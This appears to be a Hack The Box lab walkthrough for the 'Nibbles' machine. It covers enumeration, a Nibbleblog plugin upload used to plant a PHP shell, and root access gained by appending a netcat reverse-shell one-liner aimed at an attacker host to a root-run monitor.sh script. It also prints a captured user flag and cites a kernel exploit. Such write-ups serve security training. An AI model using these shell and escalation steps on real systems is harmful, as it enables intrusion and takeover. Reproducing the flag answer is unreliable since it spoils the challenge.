# Nibbles HTB, IP 10.10.10.75

# Initial Enumeration

**1. nmap -sC -sV  10.10.10.75**


2. Dirbuster/ Gobuster
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog
dirb http://10.10.10.75/nibbleblog -X .php,.bit,.html,.sh

-------------------------------------------------------------------------------------------------------------------------------
#Port Enumeration

1. Enumerating on port 80


View page source: Control +U
 
 
 
Interesting Files

http://10.10.10.75/nibbleblog/
 
 After searching  Nibbleblog it is a powerful engine for creating blogs. 
 
 searchsploit nibbleblog
 

http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
Upload PHP shell, ignore warnings
Visit
http://localhost/nibbleblog/content/private/plugins/my_image/image.php.
Done, we have an unprivileged shell!!



Interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color

cat user.txt
b02ff32bb332deba49eeaed21152c8d8

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
#1 Privilege Escalation monitor.sh file
sudo -l




unzip personal.zip


Notes:
When we see a back up file we first look at permissions and potential vulnerarle code. Then we google the file in order to find more info.
If we cannot overwrite the file we could rename it, remove it, zip it or make my own file containing bash, reverse shell.
The concept when a file runs as root is to add code(reverse-shell).

Add a reverse shell to monitor.sh.
echo “rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacking machine>  4422 > /tmp/f” >> monitor.sh


monitor.sh file runs as administrator

Notes:
  A System Administrator has to monitor the servers, users, logs, create backup.. For the most repetitive task most of the administrator write a script like monitor.sh to automate their day-to-day repetitive task.
  
#2 Kernel Exploit
Additionally, this box is vulnerable to a kernel exploit. This monitor.sh file script showed OS Vesion 16.04.3.

  
  
CVE ID 44298
Resource:  https://www.exploit-db.com/exploits/44298

  
 
